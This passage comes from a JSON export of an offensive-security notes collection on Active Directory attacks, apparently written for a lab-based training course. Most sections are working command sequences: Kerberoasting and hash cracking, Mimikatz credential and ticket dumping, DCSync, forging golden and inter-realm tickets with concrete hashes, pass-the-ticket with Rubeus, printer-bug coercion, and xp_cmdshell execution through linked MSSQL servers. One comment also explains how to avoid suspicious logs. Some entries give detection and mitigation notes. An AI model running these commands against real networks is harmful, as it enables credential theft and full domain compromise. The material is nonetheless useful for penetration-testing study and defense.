support572user -ServicePrincipalNames @{Add=\"dcorp/bufusvc\"}\n```\n\n### Extracting Tickets\n\n```powershell\n# PowerShell built-in\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n\n# PowerView\nRequest-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n\n# Check if TGS has been granted\nklist\n\n# Extract tickets with mimikatz\nInvoke-Mimikatz -Command '\"kerberos::list /export\"'\n\npython.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt \".\\1-40a10000-student572@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi\"\n```\n\n### Extracting Hashes\n\n```powershell\n# Rubeus\n# Find all kerberoastable users and save hashes to file\n.\\Rubeus.exe kerberoast /outfile:hashes.kirbi\n\n# For specific SPN\n.\\Rubeus.exe kerberoast /spn:MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local /outfile:mssqlsvc.kirbi\n\n# Using Invoke-Kerberoast.ps1\nInvoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII ticket.kirbi\n\n# Remotely with impacket\nGetUserSPNs.py dcorp-dc/user:password -dc-ip 10.10.10.10 -request\n\n# Crack hash with hashcat\nhashcat -a 0 -m 13100 hash.txt rockyou.txt\n```\n\n## Detection\n\n- Security event ID 4769: A Kerberos ticket was requested\n- Filter results based on the following information from logs\n  - Service name should not be krbtgt\n  - Service name does not end with $ (to filter out machine accounts used for services)\n  - Account name should not be machine@domain (to filter out requests from machines)\n  - Failure code is '0x0' (to filter out failures, 0x0 is success)\n  - Most importantly, ticket encryption type is 0x17\n\n```powershell\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split\"`n\")[8] -ne 'krbtgt' -and $_.Message.split\"`n\")[8] -ne '*$' -and $_.Message.split\"`n\")[3] -notlike '*$@*' -and $_.Message.split\"`n\")[18] -like '*0x0*' -and $_.Message.split\"`n\")[17] -like \"*0x17*\"} | Select -ExpandProperty message\n```\n\n## Mitigation\n\n- Strong service account passwords\n- Don't make service accounts domain admins\n- Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj128431(v=ws.11)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/unconstrained_delegation",
    "path": "active_directory/privilege_escalation/unconstrained_delegation.md",
    "title": "Unconstrained_delegation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Unconstrained Delegation General - When set for service account, allows delegation to any service to any resource on the domain as a user - When enabled, DC places user's TGT inside TGS when user requ...",
    "category": "active_directory",
    "content": "# Unconstrained Delegation\n\n## General\n\n- When set for service account, allows delegation to any service to any resource on the domain as a user\n- When enabled, DC places user's TGT inside TGS when user requests access to service with unconstrained delegation enabled\n- Server extracts TGT from TGS and stores it in LSASS\n- Server can reuse the user's TGT to access resoruces\n- Escalate privileges when extracting TGT from Domain Admins or other HVTs\n- Note: need local admin access on the machine to extract tickets\n\n## Exploitation\n\n```powershell\n# Get computers that have unconstrained delegation enabled\n# Using PowerView\nGet-NetComputer -Unconstrained\n\n# Using AD Module\nGet-ADComputer -Filter { TrustedForDelegation -eq $true }\nGet-ADUser -Filter { TrustedForDelegation -eq $true }\n\n# ldapdomaindump\nldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10   \ngrep TRUSTED_FOR_DELEGATION domain_computers.grep\n\n# CrackMapExec\ncrackmapexec ldap 10.10.10.10 -u username -p password --trusted-for-delegation\n\n# Monitor DA logins on computer\nInvoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose\n\n# Check if we have local admin access on that machine using PowerView\nFind-LocalAdminAccess -ComputerName dcorp-appsrv\n\n# Get session on machine as local admin and check for tickets\nInvoke-Mimikatz -Command '\"sekurlsa::tickets\"'\n\n# Export tickets\nInvoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'\n\n# Inject ticket into session\nInvoke-Mimikatz -Command '\"kerberos:ptt ticket.kirbi\"'\n```\n\n## Printer Bug\n\n- Trick HVT to connect to machine with Unconstrained Delegation enabled\n- Force Domain Admin to connect to specific machine\n- https://github.com/leechristensen/SpoolSample\n\n```powershell\n# Start capturing for TGTs using Rubeus\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# Run MS-RPRN.exe\n.\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appserv.dollarcorp.moneycorp.local\n\n# From https://github.com/leechristensen/SpoolSample\n.\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME\n.\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB\n# DC01.HACKER.LAB is the domain controller we want to compromise\n# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.\n\n# From https://github.com/dirkjanm/krbrelayx\nprinterbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>\n\n# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689\npython dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>\n\n# Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine\n.\\Rubeus.exe ptt /ticket:ticket.kirbi\n\n# Run DCSync\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n```\n\n## Mitigation\n\n- Limit DA/Admin logins to specific servers\n- Set \"Account is sensitive and cannot be delegated\" for privileged accounts\n\n## Further Reading\n\n- [HackTricks: Unconstrained Delegation](https://book.hacktricks.xyz/windows/active-directory-methodology/unconstrained-delegation)\n- [PayloadsAllTheThings: Kerberos Unconstrained Delegation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-unconstrained-delegation)\n- [iRedTeam: Kerberos Unconstrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)\n- [iRedTeam: Domain Compromise via DC Print Server and Kerberos Delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)\n- [Security Focus: Analysing Account is Sensitive and cannot be Delegated for Privileged Accounts](https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)\n- [SpecterOps: Hunting in Active Directory: Unconstrained Delegation & Forest Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/trust_attacks/README",
    "path": "active_directory/trust_attacks/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Trust Attacks",
    "category": "active_directory",
    "content": "# Trust Attacks\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/trust_attacks/cross_domain_attacks",
    "path": "active_directory/trust_attacks/cross_domain_attacks.md",
    "title": "Cross_domain_attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Cross Domain Attacks General - Domains in the same forest have an implicit two-way trust relationship - There is a trust key between the parent and child domains - There are two ways of escalating pri...",
    "category": "active_directory",
    "content": "# Cross Domain Attacks\n\n## General\n\n- Domains in the same forest have an implicit two-way trust relationship\n- There is a trust key between the parent and child domains\n- There are two ways of escalating privileges between two domains of the same forest\n  - Krbtgt hash\n  - Trust tickets\n\n### Authentication Process for Resource in Different Domain\n\n1. Client requests TGT from DC in own domain\n2. DC sends back TGT\n3. Client shows TGT when requesting TGS for resource in another domain\n4. DC checks global catalog and finds resource in another domain\n5. DC sends back inter-realm TGT encrypted with Trust Key\n6. Client sends inter-realm TGT when requesting TGS for resource to DC of target domain\n7. DC checks if trust key is valid\n8. If yes, sends back TGS\n9. Client presents TGS when accessing target resource\n10. Target resource checks if client can access resource\n\n## Exploitation\n\n### Child to Forest Root Using Trust Key\n\n- Vulnerable step here is step 6, sending the TGT encrypted with trust key\n- If we have the trust key, we can forge a ticket\n- Escalate privileges from Domain Admin in current domain to Enterprise Admin or DA in forest root\n\n#### Arguments\n\n| Argument | Description |\n| --- | --- |\n| kerberos::golden | Module name |\n| /domain:domain:dollarcorp.moneycorp.local | FQDN of current domain |\n| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the currentdomain |\n| /User:Administrator | User to impersonate |\n| /target:moneycorp.local | FQDN of the target/parent domain |\n| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of the Enterprise Admins group of the parent/target domain |\n| /rc4:200a7dab8e762344bd76a62acac42568 | RC4 hash of the trust key |\n| /ticket:trust_tgt.kirbi | Save ticket to file for later use |\n| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |\n| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |\n| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |\n| /ptt | Inject ticket in current PowerShell process |\n\n#### Commands\n\n```powershell\n# Dump trust key from DC with mimikatz\n# Look for [In] trust key from child to parent\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"' -ComputerName dcorp-dc\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\mcorp$\"'\n\n# Get SID of Enterprise Admins Group using PowerView 3.0\nGet-DomainGroup -Domain moneycorp.local \"Enterprise Admins\" | Select objectsid\n\n# Forge inter-realm TGT\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:moneycorp.local /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:200a7dab8e762344bd76a62acac42568 /service:krbtgt /ticket:trust_key_tgt.kirbi\"'\n\n# Use inter-realm ticket to get and use TGS for CIFS service on DC of the parent domain\n.\\Rubeus.exe asktgs /ticket:trust_key_tgt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt\n\n# Check access\nls \\\\mcorp-dc.moneycorp.local\\c$\n```\n\n### Child to Forest Root Using Krbtgt Hash\n\n- Same principle as using trust key\n- But: no need to explicitly request TGS for specific service\n- Works like golden ticket\n\n```powershell\n# Dump krbtgt hash with DA privileges\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"'\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n\n# Forge inter-realm TGT\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi\"'\n\n# Avoid suspicious logs by using SID of Domain Controllers and Enterprise Domain Controllers\n# S-1-5-21 = Domain Controllers\n# S-1-5-9  = Enterprise Domain Controllers\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:dcorp-dc$ /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi\"'\n\n# Inject ticket into session\nInvoke-Mimikatz -Command '\"kerberos::ptt trust_krbtgt_tgt.kirbi\"'\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/trust_attacks/cross_forest_attacks",
    "path": "active_directory/trust_attacks/cross_forest_attacks.md",
    "title": "Cross_forest_attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Cross Forest Attacks General - Same attack flow as with cross-domain attacks - But: trust between forest must be established manually - No implicit trust - Cannot abuse SID because of SID filtering - ...",
    "category": "active_directory",
    "content": "# Cross Forest Attacks\n\n## General\n\n- Same attack flow as with cross-domain attacks\n- But: trust between forest must be established manually\n- No implicit trust\n- Cannot abuse SID because of SID filtering\n- We only get the privileges the user we are impersonating has in the target forest\n\n## Exploitation\n\n```powershell\n# Get trust key for the inter-forest trust\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"' -ComputerName dcorp-dc\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -ComputerName dcorp-dc\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\ecorp$\"'\n\n# Forge inter-forest TGT\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:eurocorp.local /rc4:9a3dafc4139bc3fb7b6dade2a35d6f74 /service:krbtgt /ticket:forest_tgt.kirbi\"'\n\n# Request and inject TGS for CIFS service using Rubeus\n.\\Rubeus.exe asktgs /ticket:forest_tgt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt\n\n# Check access\nls \\\\eurocorp-dc.eurocorp.local\\SharedWithDCorp\\\n```\n\n## Mitigation\n\n### SID Filtering\n\n- Avoid attacks which abuse SID history attribute across forest trust\n- Enabled by default on all inter forest trusts. Intra forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary)\n- But, since SID filtering has potential to break applications and user access, it is often disabled\n\n### Selective Authentication\n\n- If configured in an inter-forest trust, users between trusts will not be automatically authenticated\n- Invididual access to domains and servers in the trusting domain/forest should be given\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/trust_attacks/mssql_servers",
    "path": "active_directory/trust_attacks/mssql_servers.md",
    "title": "Mssql_servers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "MSSQL Servers General - Generally deployed in a lot of Windows domains - Good option for lateral movement as domain users can be mapped to database roles - We can use PowerUpSQL for exploitation - Che...",
    "category": "active_directory",
    "content": "# MSSQL Servers\n\n## General\n\n- Generally deployed in a lot of Windows domains\n- Good option for lateral movement as domain users can be mapped to database roles\n- We can use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) for exploitation\n- [Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)\n\n## Exploitation\n\n### Enumeration\n\n```powershell\n# Discovery (SPN Scanning)\nGet-SQLInstanceDomain\n\n# Check accessibility\nGet-SQLConnectionTestThreaded\nGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose\n\n# Gather information\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n```\n\n### Database Links\n\n- Database link allows a SQL Server to access exteranl data sources like other SQL server and OLE DB data sources\n- For links between SQL servers, we can exectue stored procedures\n- Links work across forest trusts\n\n#### Using PowerUpSQL\n\n```powershell\n# Look for links to remote server\nGet-SQLServerLink -Instance dcorp-mssql -Verbose\n\n# Enumerate database links\nGet-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose\n\n# Execute commands\nGet-SQLServerLinkCrawl -Instance dcorp-mssql -Query \"exec master..xp_cmdshell 'whoami'\"\n```\n\n#### Using SQL Queries\n\n```sql\n/* Enumerate database links */\nselect * from master..sysservers\n\n/* Run queries on a linked database through OpenQuery() */\nselect * from openquery(\"dcorp-sql1\", \"select * from master..sysservers\")\n\n/* Chain queries to access nested links */\nselect * from openquery(\"dcorp-sql\", 'select * from openquery(\"dcorp-mgmt\", \"select * from master..sysservers\")')\n\n/* Enable xp_cmdshell */\nEXECUTE('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"eu-sql\"\n\n/* Execute commands using nested link queries */\nselect * from openquery(\"dcorp-sql1\", 'select * from openquery(\"dcorp-mgmt\", \"select * from openquery(\"eu-sql.eu.eurocorp.local\", \"\"select @@version as version; exec master..xp_cmdshell \"powershell whoami)\"\")\")')\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "static/img/Pasted",
    "path": "static/img/Pasted.md",
    "title": "Pasted",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "",
    "category": "static",
    "content": "",
    "frontmatter": {}
  }
]